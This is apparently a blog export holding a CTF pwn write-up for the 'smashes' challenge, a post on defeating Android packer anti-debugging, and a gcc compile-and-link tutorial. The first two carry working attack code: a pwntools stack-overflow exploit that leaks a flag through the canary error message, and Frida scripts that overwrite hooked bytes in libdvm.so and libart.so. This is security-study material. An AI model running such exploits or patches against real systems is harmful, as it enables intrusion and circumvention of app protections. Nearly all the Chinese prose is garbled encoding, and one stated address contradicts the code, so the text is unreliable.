<pre><code>@ubuntu:~/Desktop$ python -c &apos;print &quot;a&quot;*0x218+&quot;\x20\x0d\x40\x00\x00\x00\x00\x00&quot;+&quot;\n&quot;+&quot;a&quot;&apos; | ./smashes
Hello!
What&apos;s your name? Nice to meet you, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa 
Please overwrite the flag: Thank you, bye!
*** stack smashing detected ***: PCTF{Here&apos;s the flag on server} terminated
Aborted (core dumped)
</code></pre><p>æç¤ºflagåœ¨æœåŠ¡å™¨ä¸Šï¼Œç„¶è€Œè¿œç¨‹è¿æ¥è¿‡å»æ˜¯ä¸ä¼šæˆåŠŸçš„ã€‚</p>
<p>æ³¨æ„ä¸è¦ç”¨åŸæ¥flagçš„åœ°å€è¦†ç›–ï¼Œå› ä¸ºåŸæ¥å­˜å‚¨flagçš„åœ°æ–¹ä¼šè¢«overwriteã€‚ä½†æ˜¯ç”±äºELFçš„æ˜ å°„æ–¹å¼ï¼Œæ­¤flagä¼šè¢«æ˜ å°„ä¸¤æ¬¡ï¼Œå¦å¤–ä¸€ä¸ªåœ°æ–¹flagçš„å†…å®¹ä¸ä¼šå˜ã€‚</p>
<p>åŸå› æ˜¯<strong>stack_chk_failä¼šè°ƒç”¨</strong>libc_message</p>
<pre><code>void
__libc_message (int do_abort, const char *fmt, ...)
{
  va_list ap; 
  int fd = -1; 
  va_start (ap, fmt);
  /* Open a descriptor for /dev/tty unless the user explicitly
     requests errors on standard error.  */
  const char *on_2 = __libc_secure_getenv (&quot;LIBC_FATAL_STDERR_&quot;);
  if (on_2 == NULL || *on_2 == &apos;\0&apos;)
    fd = open_not_cancel_2 (_PATH_TTY, O_RDWR | O_NOCTTY | O_NDELAY);
  if (fd == -1) 
    fd = STDERR_FILENO;
  /*......*/
}
</code></pre><p>å¦‚æœLIBC_FATAL<em>STDERR</em>ç¯å¢ƒå˜é‡æ²¡æœ‰è®¾ç½®æˆ–è€…ä¸ºç©ºï¼Œstderrä¼šredirectåˆ°_PATH_TTYï¼Œé€šå¸¸æ˜¯/dev/ttyï¼Œå› æ­¤é”™è¯¯ä¿¡æ¯å°†ä¸ä¼šè¾“å‡ºåˆ°stderrè€Œæ˜¯æœåŠ¡ç«¯å¯è§çš„è®¾å¤‡ã€‚<br>æ‰€ä»¥æˆ‘ä»¬å¿…é¡»è®¾ç½®è¿™ä¸ªç¯å¢ƒå˜é‡ï¼Œæ­£å¥½å¯ä»¥ç”¨è¿™ä¸ªç¯å¢ƒå˜é‡å»è¦†ç›–flagçš„å†…å®¹ã€‚</p>
<p>æœ€ç»ˆexp:</p>
<pre><code>from pwn import *
old_flag_addr = 0x600d20
new_flag_addr = 0x400d20
#p = process(&apos;./smashes&apos;)
p = remote(&apos;pwn.jarvisoj.com&apos;, 9877)
p.recvuntil(&quot;name?&quot;)
payload = &quot;a&quot;*0x218 + p64(new_flag_addr) 
payload += p64(0) + p64(old_flag_addr)
p.sendline(payload)
p.recvuntil(&quot;flag: &quot;)
env = &quot;LIBC_FATAL_STDERR_=1&quot;
p.sendline(env)
flag = p.recv()
print flag
</code></pre><p>æ ¹æ®glibcçš„æºç å¯çŸ¥ï¼Œåªè¦ç¨‹åºå¼€äº†canaryæ ˆä¿æŠ¤ï¼Œå°±å¯ä»¥è¦†ç›–argv[0]æ¥æ³„éœ²æƒ³è¦çš„ä¿¡æ¯(&amp;set LIBC_FATAL<em>STDERR</em>=1)ã€‚</p>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>stack</tag>
      </tags>
  </entry>
  <entry>
    <title>æ¢†æ¢†&amp;çˆ±åŠ å¯†javaåè°ƒè¯•ç»•è¿‡</title>
    <url>/2020/05/19/%E6%A2%86%E6%A2%86-%E7%88%B1%E5%8A%A0%E5%AF%86java%E5%8F%8D%E8%B0%83%E8%AF%95%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<p>å„ä½é“å‹æœ‰æ²¡æœ‰åœ¨è¶Šè¿‡é‡é‡nativeåè°ƒè¯•è„±æ‰å£³ä¹‹åæƒ³è¦è°ƒè¯•smaliçš„è¿‡ç¨‹ä¸­çªç„¶å‘ç°åœ¨ä½¿ç”¨AndroidStdioåŠ¨æ€è°ƒè¯•smaliçš„æ—¶å€™åªè¦ä¸€æŒ‚è½½APPå°±ä¼šå´©æºƒï¼Œæœ¬ç¯‡ä¸»è¦æ•´ç†ä¸€ä¸‹åœ¨è°ƒè¯•æ¢†æ¢†&amp;çˆ±åŠ å¯†è¿‡ç¨‹ä¸­é‡åˆ°çš„javaå±‚åè°ƒè¯•ä»¥åŠç»•è¿‡çš„æ–¹å¼<br><a id="more"></a></p>
<p>åœ¨å°†æ¢†æ¢†&amp;çˆ±åŠ å¯†è„±å£³ä¹‹åé€šè¿‡ASè°ƒè¯•APPé‡åˆ°åè°ƒè¯•æŒ‚è½½å¤±è´¥ï¼Œåªè¦debugä¾¿ä¼šæ€æ‰APPè¿›ç¨‹</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/javaDebug9.png" alt=""></p>
<h1 id="Dalvikè™šæ‹Ÿæœºä¸‹çš„åè°ƒè¯•ç»•è¿‡"><a href="#Dalvikè™šæ‹Ÿæœºä¸‹çš„åè°ƒè¯•ç»•è¿‡" class="headerlink" title="Dalvikè™šæ‹Ÿæœºä¸‹çš„åè°ƒè¯•ç»•è¿‡"></a>Dalvikè™šæ‹Ÿæœºä¸‹çš„åè°ƒè¯•ç»•è¿‡</h1><p>è™½ç„¶Dalvikå·²ç»åœ¨é€æ­¥é€€å‡ºå¸‚åœºï¼Œä½†æ˜¯è¿™é‡Œè¿˜æ˜¯ç”±ä»–å¼€å§‹ï¼Œå¤§å®¶éƒ½çŸ¥é“Dalvikçš„æ ¸å¿ƒåº“æ˜¯libdvm.soï¼Œåœ¨è°ƒè¯•çš„è¿‡ç¨‹ä¸­ä¸APPå»ºç«‹è¿æ¥å°‘ä¸äº†å¯¹libdvm.soçš„å¼•ç”¨ï¼Œå› æ­¤libdvm.soå‡ ä¹æ˜¯æœ€æœ‰å«Œç–‘çš„åœ°æ–¹ã€‚</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/javaDebug.jpg" alt=""></p>
<h2 id="è·å–libdvm-so"><a href="#è·å–libdvm-so" class="headerlink" title="è·å–libdvm.so"></a>è·å–libdvm.so</h2><p>æ‰€è°“è·å–libdvm.soéœ€è¦è·å–APPæœªå¯åŠ¨æ—¶libdvm.soæºæ–‡ä»¶ï¼Œè¿™é‡Œåªè¦å»/system/libç›®å½•ä¸‹å°†å…¶æå–åˆ°æœ¬åœ°å³å¯ã€‚<br>å…¶æ¬¡éœ€è¦åŠ å›ºAPPè¿è¡Œæ—¶libdvm.soï¼Œè¿™é‡Œæˆ‘é€šè¿‡IDAåŠ¨æ€æŒ‚è½½APPä¹‹åå°†å…¶ä»å†…å­˜ä¸­dumpå‡ºæ¥ã€‚</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">auto</span> fp, begin, end, dexbyte;</div><div class="line">  fp = fopen(<span class="string">"D:\\dump.so"</span>, <span class="string">"wb"</span>);</div><div class="line">  begin = <span class="number">0x786A0000</span>;</div><div class="line">  end = begin + <span class="number">0x67000</span> ;</div><div class="line">  <span class="keyword">for</span> ( dexbyte = begin; dexbyte &lt; end; dexbyte ++ )</div><div class="line">      fputc(Byte(dexbyte), fp);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>å°å°è„šæœ¬ï¼Œä¸æˆæ•¬æ„</p>
<h2 id="æ¯”è¾ƒlibdvm-so"><a href="#æ¯”è¾ƒlibdvm-so" class="headerlink" title="æ¯”è¾ƒlibdvm.so"></a>æ¯”è¾ƒlibdvm.so</h2><p>åœ¨è·å–åˆ°ä¸¤ä¸ªlibdvm.soä¹‹åé€šè¿‡BeyondCompareè¿›è¡Œæ¯”è¾ƒ</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/javaDebug5.png" alt=""></p>
<p>é€šè¿‡æ¯”è¾ƒå¯ä»¥çœ‹å‡ºåœ¨åŠ å›ºçš„APPè¿è¡Œä¹‹åï¼Œlibdvm.soè¢«æ”¹äº†å‡ éƒ¨åˆ†æ•°æ®ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰ä¸åŒçš„åœ°æ–¹éƒ½å’Œåè°ƒè¯•æœ‰å…³ï¼Œé€šè¿‡IDAå¯¹ç…§ä¾¿å®œå»çœ‹çœ‹éƒ½æ”¹äº†ä»€ä¹ˆåœ°æ–¹ï¼Œæœ€ç»ˆå‘ç°ä¸javaè°ƒè¯•ç›¸å…³çš„åœ°å€ä¸º0x423B0ï¼Œå½“ç„¶å…¶ä»–åœ°æ–¹ä¹Ÿæœ‰ä¸€äº›å°æƒŠå–œï¼Œæ¯”å¦‚æ¢†æ¢†&amp;çˆ±åŠ å¯†æŠ½å–å‡½æ•°æ‰€hookçš„å‡½æ•°ä»€ä¹ˆçš„ã€‚</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/javaDebug2.png" alt=""></p>
<p>_Z12dvmDbgActivevæ˜¯javaè°ƒè¯•ç›¸å…³å‡½æ•°ï¼Œä¸»è¦åŠŸèƒ½æ˜¯å•¥æˆ‘ä¹Ÿä¸æ˜¯å¾ˆæ¸…æ¥šï¼Œæœ‰æ¸…æ¥šçš„å¤§ä½¬å¸Œæœ›å¯ä»¥ç•™è¨€å‘ŠçŸ¥ä¸€ä¸‹ï¼Œä¸‡åˆ†æ„Ÿè°¢ã€‚</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/javaDebug7.jpg" alt=""></p>
<p>ç”±æ­¤å¯è§åŠ å›ºAPPæ˜¯é€šè¿‡hook _Z12dvmDbgActivevå‡½æ•°ä½¿å…¶è·³è½¬åˆ°å®ƒè‡ªå·±æ„é€ çš„å‡½æ•°ï¼Œå¹¶ä¸”åœ¨å…¶ä¸­å°†è¿›ç¨‹killæ‰é˜²æ­¢è°ƒè¯•ã€‚é‚£ä¹ˆæˆ‘ä»¬åªè¦å°†Hookä¹‹åçš„libdvm.soå†Hookä¿®æ”¹ä¸ºåŸå‡½æ•°ï¼Œè®©å…¶æ­£å¸¸è¿è¡Œ_Z12dvmDbgActivevå‡½æ•°ï¼Œå°±å¯ä»¥ç»•è¿‡åè°ƒè¯•äº†ã€‚</p>
<h2 id="Hook-libdvm-so"><a href="#Hook-libdvm-so" class="headerlink" title="Hook libdvm.so"></a>Hook libdvm.so</h2><p>è¿™é‡Œé€šè¿‡frida hook _Z12dvmDbgActivevå‡½æ•°åœ°å€ï¼Œæ‰“å°å†…å­˜ï¼Œå°†åŸæœ¬å‡½æ•°æ­£ç¡®å†…å­˜æ•°æ®å†™å…¥å¯¹åº”åœ°å€ä¸­</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="keyword">import</span> frida</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span><span class="params">(message, data)</span>:</span></div><div class="line">    print(message)</div><div class="line"></div><div class="line">redv = frida.get_remote_device()</div><div class="line">session = redv.attach(<span class="string">"com.sf.activity"</span>)</div><div class="line"></div><div class="line">src = <span class="string">"""</span></div><div class="line">    var jnibind1 = undefined;</div><div class="line">    var jnibind2 = undefined;</div><div class="line">    var jnibind3 = undefined;</div><div class="line">    var jnibind4 = undefined;</div><div class="line">    var jnibind5 = undefined;</div><div class="line">    var jnibind6 = undefined;</div><div class="line">    var jnibind7 = undefined;</div><div class="line">    var f = Module.findBaseAddress("libdvm.so");</div><div class="line">    console.log("address: " + f);</div><div class="line">    jnibind1 = f.add(0x000423C0);</div><div class="line">    var p1P = new NativePointer(jnibind1);</div><div class="line">    aryBuffer1 = Memory.readByteArray(p1P, 16);</div><div class="line">    console.log(aryBuffer1);</div><div class="line">    var vArray = [0x0D,0x4B,0x0E,0x4A,0x7B,0x44,0x10,0xB5,0x9C,0x58,0x94,0xF8,0xC6,0x33];</div><div class="line">    Memory.writeByteArray(p1P, vArray);</div><div class="line">    var p1P = new NativePointer(jnibind1);</div><div class="line">    aryBuffer1 = Memory.readByteArray(p1P, 16);</div><div class="line">    console.log(aryBuffer1);</div><div class="line">        </div><div class="line">"""</div><div class="line">script = session.create_script(src)</div><div class="line">script.on(<span class="string">"message"</span>, on_message)</div><div class="line">script.load()</div><div class="line">sys.stdin.read()</div></pre></td></tr></table></figure>
<p>frida hookä¹‹åç»“æœ</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/javaDebug10.png" alt=""></p>
<p>åè°ƒè¯•å·²ç»ç»•è¿‡å•¦ï¼ï¼ï¼</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/javaDebug8.png" alt=""></p>
<h1 id="Artè™šæ‹Ÿæœºä¸‹çš„åè°ƒè¯•ç»•è¿‡"><a href="#Artè™šæ‹Ÿæœºä¸‹çš„åè°ƒè¯•ç»•è¿‡" class="headerlink" title="Artè™šæ‹Ÿæœºä¸‹çš„åè°ƒè¯•ç»•è¿‡"></a>Artè™šæ‹Ÿæœºä¸‹çš„åè°ƒè¯•ç»•è¿‡</h1><h2 id="è·å–libart-so"><a href="#è·å–libart-so" class="headerlink" title="è·å–libart.so"></a>è·å–libart.so</h2><p>artè™šæ‹Ÿæœºä¸‹çš„åè°ƒè¯•ç»•è¿‡åŒä¸Šè¿°çš„dalvikæ–¹æ³•ç›¸åŒï¼Œåªæ˜¯å…³é”®çš„è¿è¡Œåº“libdvm.soæ›¿æ¢ä¸ºlibart.so,åŒæ ·è¦å»/system/libç›®å½•ä¸‹å°†å…¶æå–åˆ°æœ¬åœ°ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯åœ¨æå–ä¹‹å‰è¦ç¡®è®¤è¿è¡Œçš„æ˜¯libart.soè¿˜æ˜¯libart64.soã€‚</p>
<h2 id="æ¯”è¾ƒlibart-so"><a href="#æ¯”è¾ƒlibart-so" class="headerlink" title="æ¯”è¾ƒlibart.so"></a>æ¯”è¾ƒlibart.so</h2><p>åœ¨è·å–åˆ°ä¸¤ä¸ªlibart.soä¹‹åé€šè¿‡BeyondCompareè¿›è¡Œæ¯”è¾ƒ</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/javaDebug6.png" alt=""></p>
<p>æœ€ç»ˆç¡®è®¤åè°ƒè¯•Hookåœ°å€ä¸º0x10ABC4</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/javaDebug4.png" alt=""></p>
<p>_ZN3art3Dbg8GoActiveEvå‡½æ•°åŠŸèƒ½åŒDalvikä¸­_Z12dvmDbgActivevå‡½æ•°åŠŸèƒ½ç±»ä¼¼ï¼Œç»•è¿‡æ–¹æ³•ä¸Dalvikä¿æŒä¸€è‡´ã€‚</p>
<h2 id="Hook-libart-so"><a href="#Hook-libart-so" class="headerlink" title="Hook libart.so"></a>Hook libart.so</h2><p>è¿™é‡Œé€šè¿‡frida hook _ZN3art3Dbg8GoActiveEvå‡½æ•°åœ°å€ï¼Œæ‰“å°å†…å­˜ï¼Œå°†åŸæœ¬å‡½æ•°æ­£ç¡®å†…å­˜æ•°æ®å†™å…¥å¯¹åº”åœ°å€ä¸­</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="keyword">import</span> frida</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span><span class="params">(message, data)</span>:</span></div><div class="line">    print(message)</div><div class="line"></div><div class="line">redv = frida.get_remote_device()</div><div class="line">session = redv.attach(<span class="string">"com.sf.activity"</span>)</div><div class="line"></div><div class="line">src = <span class="string">"""</span></div><div class="line">    var jnibind1 = undefined;</div><div class="line">    var jnibind2 = undefined;</div><div class="line">    var jnibind3 = undefined;</div><div class="line">    var jnibind4 = undefined;</div><div class="line">    var jnibind5 = undefined;</div><div class="line">    var jnibind6 = undefined;</div><div class="line">    var jnibind7 = undefined;</div><div class="line">    var f = Module.findBaseAddress("libart.so");</div><div class="line">    console.log("address: " + f);</div><div class="line">    jnibind1 = f.add(0x00115BC4);</div><div class="line">    var p1P = new NativePointer(jnibind1);</div><div class="line">    aryBuffer1 = Memory.readByteArray(p1P, 16);</div><div class="line">    console.log(aryBuffer1);</div><div class="line">    var vArray = [0x2D, 0xE9, 0xF0, 0x4F, 0x9B, 0xB0, 0xDF, 0xF8, 0xBC, 0x0D, 0xDF, 0xF8, 0xBC, 0x1D];</div><div class="line">    Memory.writeByteArray(p1P, vArray);</div><div class="line">    var p1P = new NativePointer(jnibind1);</div><div class="line">    aryBuffer1 = Memory.readByteArray(p1P, 16);</div><div class="line">    console.log(aryBuffer1);</div><div class="line">        </div><div class="line">"""</div><div class="line">script = session.create_script(src)</div><div class="line">script.on(<span class="string">"message"</span>, on_message)</div><div class="line">script.load()</div><div class="line">sys.stdin.read()</div></pre></td></tr></table></figure>
<p>#æ€»ç»“<br>è¿™é‡Œå†ç®€è¿°ä¸€ä¸‹åè°ƒè¯•çš„åŸç†ï¼Œå£³APPé€šè¿‡Hook libdvm.so&amp;libart.soä¸­çš„_Z12dvmDbgActivev&amp;_ZN3art3Dbg8GoActiveEvå‡½æ•°ï¼Œä½¿å…¶è·³è½¬åˆ°è‡ªå·±å†™çš„å‡½æ•°ä¸­æ‰§è¡Œkillæ“ä½œå¯¼è‡´æ— æ³•è°ƒè¯•ã€‚<br>ç›®å‰åœ¨è„±å£³ä¹‹åé‡åˆ°javaåè°ƒè¯•ï¼Œçš†å¯ç”¨å¯¹æ¯”libdvm.so&amp;libart.soå¯»æ‰¾å·®å¼‚ç‚¹å°†å…¶ä¿®å¤ç»•è¿‡åè°ƒè¯•ï¼Œæ„Ÿå…´è¶£çš„å¤§ä½¬å¯ä»¥é€šè¿‡å…¶ä»–è¢«hookçš„å‡½æ•°ç ”ç©¶åŠ å›ºæˆ–è€…å‡½æ•°æŠ½å–çš„åŸç†ã€‚</p>
]]></content>
      <tags>
        <tag>Android</tag>
        <tag>åè°ƒè¯•</tag>
        <tag>ååè°ƒè¯•</tag>
      </tags>
  </entry>
  <entry>
    <title>ç¨‹åºçš„åŠ¨æ€é“¾æ¥å’Œé™æ€é“¾æ¥</title>
    <url>/2016/08/07/%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%92%8C%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A51/</url>
    <content><![CDATA[<p>å‚è€ƒè‡ªï¼šThis is an <a href="http://www.xuebuyuan.com/1730287.html" target="_blank" rel="external">http://www.xuebuyuan.com/1730287.html</a><br><a id="more"></a> </p>
<h2 id="ä¸€ã€ç¨‹åºç¼–è¯‘é“¾æ¥çš„æ•´ä½“æµç¨‹"><a href="#ä¸€ã€ç¨‹åºç¼–è¯‘é“¾æ¥çš„æ•´ä½“æµç¨‹" class="headerlink" title="ä¸€ã€ç¨‹åºç¼–è¯‘é“¾æ¥çš„æ•´ä½“æµç¨‹"></a>ä¸€ã€ç¨‹åºç¼–è¯‘é“¾æ¥çš„æ•´ä½“æµç¨‹</h2><p>é€šå¸¸æˆ‘ä»¬ä½¿ç”¨gccæ¥ç”Ÿæˆå¯æ‰§è¡Œç¨‹åºï¼Œå‘½ä»¤ä¸ºï¼šgcc hello.cï¼Œé»˜è®¤ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶a.out</p>
<p>å…¶å®ç¼–è¯‘ï¼ˆåŒ…æ‹¬é“¾æ¥ï¼‰çš„å‘½ä»¤ï¼šgcc hello.c å¯åˆ†è§£ä¸ºå¦‚ä¸‹4ä¸ªå¤§çš„æ­¥éª¤ï¼š</p>
<pre><code>é¢„å¤„ç†(Preprocessing)
ç¼–è¯‘(Compilation)
æ±‡ç¼–(Assembly)
é“¾æ¥(Linking)
</code></pre><p><img src="http://smilejay.b0.upaiyun.com/wp-content/uploads/2012/01/gcc_compilation_stages.jpg" alt=""><br>gcc compilation</p>
<h3 id="1-é¢„å¤„ç†-Preproceessing"><a href="#1-é¢„å¤„ç†-Preproceessing" class="headerlink" title="1.       é¢„å¤„ç†(Preproceessing)"></a>1.       é¢„å¤„ç†(Preproceessing)</h3><pre><code>é¢„å¤„ç†çš„è¿‡ç¨‹ä¸»è¦å¤„ç†åŒ…æ‹¬ä»¥ä¸‹è¿‡ç¨‹ï¼š
å°†æ‰€æœ‰çš„#defineåˆ é™¤ï¼Œå¹¶ä¸”å±•å¼€æ‰€æœ‰çš„å®å®šä¹‰
å¤„ç†æ‰€æœ‰çš„æ¡ä»¶é¢„ç¼–è¯‘æŒ‡ä»¤ï¼Œæ¯”å¦‚#if #ifdef #elif #else #endifç­‰
å¤„ç†#include é¢„ç¼–è¯‘æŒ‡ä»¤ï¼Œå°†è¢«åŒ…å«çš„æ–‡ä»¶æ’å…¥åˆ°è¯¥é¢„ç¼–è¯‘æŒ‡ä»¤çš„ä½ç½®ã€‚
åˆ é™¤æ‰€æœ‰æ³¨é‡Š â€œ//â€å’Œâ€/* */â€.
æ·»åŠ è¡Œå·å’Œæ–‡ä»¶æ ‡è¯†ï¼Œä»¥ä¾¿ç¼–è¯‘æ—¶äº§ç”Ÿè°ƒè¯•ç”¨çš„è¡Œå·åŠç¼–è¯‘é”™è¯¯è­¦å‘Šè¡Œå·ã€‚
ä¿ç•™æ‰€æœ‰çš„#pragmaç¼–è¯‘å™¨æŒ‡ä»¤ï¼Œå› ä¸ºç¼–è¯‘å™¨éœ€è¦ä½¿ç”¨å®ƒä»¬
</code></pre><p>é€šå¸¸ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥è¿›è¡Œé¢„å¤„ç†ï¼š</p>
<p>gcc -E hello.c -o hello.i</p>
<p>å‚æ•°-Eè¡¨ç¤ºåªè¿›è¡Œé¢„å¤„ç† æˆ–è€…ä¹Ÿå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æŒ‡ä»¤å®Œæˆé¢„å¤„ç†è¿‡ç¨‹</p>
<p>cpp hello.c &gt; hello.i      /<em>  cpp â€“ The C Preprocessor  </em>/</p>
<p>ç›´æ¥cat hello.i ä½ å°±å¯ä»¥çœ‹åˆ°é¢„å¤„ç†åçš„ä»£ç </p>
<h3 id="2-ç¼–è¯‘-Compilation"><a href="#2-ç¼–è¯‘-Compilation" class="headerlink" title="2.       ç¼–è¯‘(Compilation)"></a>2.       ç¼–è¯‘(Compilation)</h3><p>ç¼–è¯‘è¿‡ç¨‹å°±æ˜¯æŠŠé¢„å¤„ç†å®Œçš„æ–‡ä»¶è¿›è¡Œä¸€ç³»åˆ—çš„è¯æ³•åˆ†æï¼Œè¯­æ³•åˆ†æï¼Œè¯­ä¹‰åˆ†æåŠä¼˜åŒ–åç”Ÿæˆç›¸åº”çš„æ±‡ç¼–ä»£ç ã€‚</p>
<p>$gcc â€“S hello.i â€“o hello.s</p>
<p>æˆ–è€…</p>
<p>$ /usr/lib/gcc/i486-linux-gnu/4.4/cc1 hello.c</p>
<p>æ³¨ï¼šç°åœ¨ç‰ˆæœ¬çš„GCCæŠŠé¢„å¤„ç†å’Œç¼–è¯‘ä¸¤ä¸ªæ­¥éª¤åˆæˆä¸€ä¸ªæ­¥éª¤ï¼Œç”¨cc1å·¥å…·æ¥å®Œæˆã€‚gccå…¶å®æ˜¯åå°ç¨‹åºçš„ä¸€äº›åŒ…è£…ï¼Œæ ¹æ®ä¸åŒå‚æ•°å»è°ƒç”¨å…¶ä»–çš„å®é™…å¤„ç†ç¨‹åºï¼Œæ¯”å¦‚ï¼šé¢„ç¼–è¯‘ç¼–è¯‘ç¨‹åºcc1ã€æ±‡ç¼–å™¨asã€è¿æ¥å™¨ld</p>
<h3 id="3-æ±‡ç¼–-Assembly"><a href="#3-æ±‡ç¼–-Assembly" class="headerlink" title="3.       æ±‡ç¼–(Assembly)"></a>3.       æ±‡ç¼–(Assembly)</h3><p>æ±‡ç¼–å™¨æ˜¯å°†æ±‡ç¼–ä»£ç è½¬å˜æˆæœºå™¨å¯ä»¥æ‰§è¡Œçš„å‘½ä»¤ï¼Œæ¯ä¸€ä¸ªæ±‡ç¼–è¯­å¥å‡ ä¹éƒ½å¯¹åº”ä¸€æ¡æœºå™¨æŒ‡ä»¤ã€‚æ±‡ç¼–ç›¸å¯¹äºç¼–è¯‘è¿‡ç¨‹æ¯”è¾ƒç®€å•ï¼Œæ ¹æ®æ±‡ç¼–æŒ‡ä»¤å’Œæœºå™¨æŒ‡ä»¤çš„å¯¹ç…§è¡¨ä¸€ä¸€ç¿»è¯‘å³å¯ã€‚</p>
<p>$ gcc â€“c hello.c â€“o hello.o</p>
<p>æˆ–è€…</p>
<p>$ as hello.s â€“o hello.co</p>
<p>ç”±äºhello.oçš„å†…å®¹ä¸ºæœºå™¨ç ï¼Œä¸èƒ½ä»¥æ™®é€šæ–‡æœ¬å½¢å¼çš„æŸ¥çœ‹ï¼ˆvi æ‰“å¼€çœ‹åˆ°çš„æ˜¯ä¹±ç ï¼‰ã€‚</p>
<h3 id="4-é“¾æ¥-Linking"><a href="#4-é“¾æ¥-Linking" class="headerlink" title="4.       é“¾æ¥(Linking)"></a>4.       é“¾æ¥(Linking)</h3><p>é€šè¿‡è°ƒç”¨é“¾æ¥å™¨ldæ¥é“¾æ¥ç¨‹åºè¿è¡Œéœ€è¦çš„ä¸€å¤§å †ç›®æ ‡æ–‡ä»¶ï¼Œä»¥åŠæ‰€ä¾èµ–çš„å…¶å®ƒåº“æ–‡ä»¶ï¼Œæœ€åç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ã€‚</p>
<p>ld -static crt1.o crti.o crtbeginT.o hello.o -start-group -lgcc -lgcc_eh -lc-end-group crtend.o crtn.o (çœç•¥äº†æ–‡ä»¶çš„è·¯å¾„å)ã€‚</p>
<p>helloworldçš„å¤§ä½“ç¼–è¯‘å’Œé“¾æ¥è¿‡ç¨‹å°±æ˜¯è¿™æ ·äº†ï¼Œé‚£ä¹ˆç¼–è¯‘å™¨å’Œé“¾æ¥å™¨åˆ°åº•åšäº†ä»€ä¹ˆå‘¢ï¼Ÿ</p>
<p>ç¼–è¯‘è¿‡ç¨‹å¯åˆ†ä¸º6æ­¥ï¼šæ‰«æï¼ˆè¯æ³•åˆ†æï¼‰ã€è¯­æ³•åˆ†æã€è¯­ä¹‰åˆ†æã€æºä»£ç ä¼˜åŒ–ã€ä»£ç ç”Ÿæˆã€ç›®æ ‡ä»£ç ä¼˜åŒ–ã€‚</p>
<p>è¯æ³•åˆ†æï¼šæ‰«æå™¨ï¼ˆScannerï¼‰å°†æºä»£çš„å­—ç¬¦åºåˆ—åˆ†å‰²æˆä¸€ç³»åˆ—çš„è®°å·ï¼ˆTokenï¼‰ã€‚lexå·¥å…·å¯å®ç°è¯æ³•æ‰«æã€‚</p>
<p>è¯­æ³•åˆ†æï¼šè¯­æ³•åˆ†æå™¨å°†è®°å·ï¼ˆTokenï¼‰äº§ç”Ÿè¯­æ³•æ ‘ï¼ˆSyntax Treeï¼‰ã€‚yaccå·¥å…·å¯å®ç°è¯­æ³•åˆ†æ(yacc: Yet Another Compiler Compiler)ã€‚</p>
<p>è¯­ä¹‰åˆ†æï¼šé™æ€è¯­ä¹‰ï¼ˆåœ¨ç¼–è¯‘å™¨å¯ä»¥ç¡®å®šçš„è¯­ä¹‰ï¼‰ã€åŠ¨æ€è¯­ä¹‰ï¼ˆåªèƒ½åœ¨è¿è¡ŒæœŸæ‰èƒ½ç¡®å®šçš„è¯­ä¹‰ï¼‰ã€‚</p>
